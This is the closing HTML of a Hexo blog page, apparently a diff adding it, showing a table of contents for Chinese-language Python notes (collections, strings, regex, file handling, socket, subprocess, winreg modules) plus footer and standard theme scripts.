+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#代码规范"><span class="nav-text">代码规范</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#集合"><span class="nav-text">集合</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#list"><span class="nav-text">list</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#remove"><span class="nav-text">remove()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#比较"><span class="nav-text">比较</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#字符串操作"><span class="nav-text">字符串操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#in-amp-not-in"><span class="nav-text">in &amp; not in</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#index"><span class="nav-text">index()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#count"><span class="nav-text">count()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reverse"><span class="nav-text">reverse()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reversed"><span class="nav-text">reversed()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sort"><span class="nav-text">sort()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sorted"><span class="nav-text">sorted()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#del"><span class="nav-text">del</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dict"><span class="nav-text">dict</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#set"><span class="nav-text">set</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tuple"><span class="nav-text">tuple</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#添加元素"><span class="nav-text">添加元素</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除元素"><span class="nav-text">删除元素</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#求长度"><span class="nav-text">求长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#切片"><span class="nav-text">切片</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#enumerate"><span class="nav-text">enumerate()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zip"><span class="nav-text">zip()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#迭代dict的value"><span class="nav-text">迭代dict的value</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#同时迭代dict的value和key"><span class="nav-text">同时迭代dict的value和key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列表生成式"><span class="nav-text">列表生成式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复杂列表生成式"><span class="nav-text">复杂列表生成式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#max"><span class="nav-text">max()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#min"><span class="nav-text">min()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sum"><span class="nav-text">sum()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#String"><span class="nav-text">String</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#替换"><span class="nav-text">替换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#string-replace"><span class="nav-text">string.replace()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分割"><span class="nav-text">分割</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#split"><span class="nav-text">split()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input"><span class="nav-text">input()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#函数"><span class="nav-text">函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#print"><span class="nav-text">print()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#format"><span class="nav-text">format()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#print-f"><span class="nav-text">print(f)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#格式化操作符"><span class="nav-text">格式化操作符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#格式化操作符的辅助命令"><span class="nav-text">格式化操作符的辅助命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python的转义字符及含义"><span class="nav-text">Python的转义字符及含义</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正则表达式"><span class="nav-text">正则表达式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re模块"><span class="nav-text">re模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#findall"><span class="nav-text">findall()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#search"><span class="nav-text">search()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-S"><span class="nav-text">re.S</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件操作"><span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#打开文件"><span class="nav-text">打开文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1"><span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2"><span class="nav-text">方法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读文件"><span class="nav-text">读文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#打开文件-1"><span class="nav-text">打开文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readlines"><span class="nav-text">readlines()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#read"><span class="nav-text">read()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readline"><span class="nav-text">readline()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写文件"><span class="nav-text">写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#write"><span class="nav-text">write()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writelines"><span class="nav-text">writelines()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#操作CSV文件"><span class="nav-text">操作CSV文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读CSV文件"><span class="nav-text">读CSV文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写CSV文件"><span class="nav-text">写CSV文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#模块"><span class="nav-text">模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#requests模块"><span class="nav-text">requests模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#requests-get"><span class="nav-text">requests.get()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Response-content"><span class="nav-text">Response.content</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Response-content-decode"><span class="nav-text">Response.content.decode()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Response-json"><span class="nav-text">Response.json()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#requests-status-code"><span class="nav-text">requests.status_code</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#multiprocessing模块"><span class="nav-text">multiprocessing模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dummy模块"><span class="nav-text">dummy模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Pool-map"><span class="nav-text">Pool.map()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OS模块"><span class="nav-text">OS模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#创建目录"><span class="nav-text">创建目录</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#os-makedirs"><span class="nav-text">os.makedirs()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-path-join"><span class="nav-text">os.path.join()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-listdir"><span class="nav-text">os.listdir()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-rename"><span class="nav-text">os.rename()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-system"><span class="nav-text">os.system()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lxml模块"><span class="nav-text">lxml模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XPath语法"><span class="nav-text">XPath语法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python脚本"><span class="nav-text">Python脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#结构"><span class="nav-text">结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sys模块"><span class="nav-text">sys模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#socket模块"><span class="nav-text">socket模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#send"><span class="nav-text">send()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sendall"><span class="nav-text">sendall()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sendto"><span class="nav-text">sendto()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#connect"><span class="nav-text">connect()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#close"><span class="nav-text">close()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bind"><span class="nav-text">bind()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#listen"><span class="nav-text">listen()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#recv"><span class="nav-text">recv()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#recvfrom"><span class="nav-text">recvfrom()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SOCK-STREAM"><span class="nav-text">SOCK_STREAM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SOCK-DGRAM"><span class="nav-text">SOCK_DGRAM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AF-INET"><span class="nav-text">AF_INET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AF-INET6"><span class="nav-text">AF_INET6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AF-UNIX"><span class="nav-text">AF_UNIX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#异常处理"><span class="nav-text">异常处理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#错误"><span class="nav-text">错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#异常"><span class="nav-text">异常</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#语法"><span class="nav-text">语法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成exe文件"><span class="nav-text">生成exe文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#subprocess模块"><span class="nav-text">subprocess模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-Popen"><span class="nav-text">subprocess.Popen()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#optparse模块"><span class="nav-text">optparse模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#optparse-OptionParser"><span class="nav-text">optparse.OptionParser()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#optparse-add-option"><span class="nav-text">optparse.add_option()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#optparse-parse-args"><span class="nav-text">optparse.parse_args()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#optparse-attributes"><span class="nav-text">optparse.attributes</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#option-action"><span class="nav-text">option.action</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#option-type"><span class="nav-text">option.type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#option-dest"><span class="nav-text">option.dest</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#option-help"><span class="nav-text">option.help</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cymruwhois模块"><span class="nav-text">cymruwhois模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Client"><span class="nav-text">Client()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Clien-lookupmany-dict"><span class="nav-text">Clien().lookupmany_dict()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#执行系统命令"><span class="nav-text">执行系统命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#os-system-1"><span class="nav-text">os.system()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-Popen-1"><span class="nav-text">subprocess.Popen()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#winreg模块"><span class="nav-text">winreg模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#winreg-OpenKey"><span class="nav-text">winreg.OpenKey()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chessur</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').not('.gist .highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+        if (result) $(this).text('Copied');
+        else $(this).text('Copy failed');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('Copy');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+</body>
+</html>
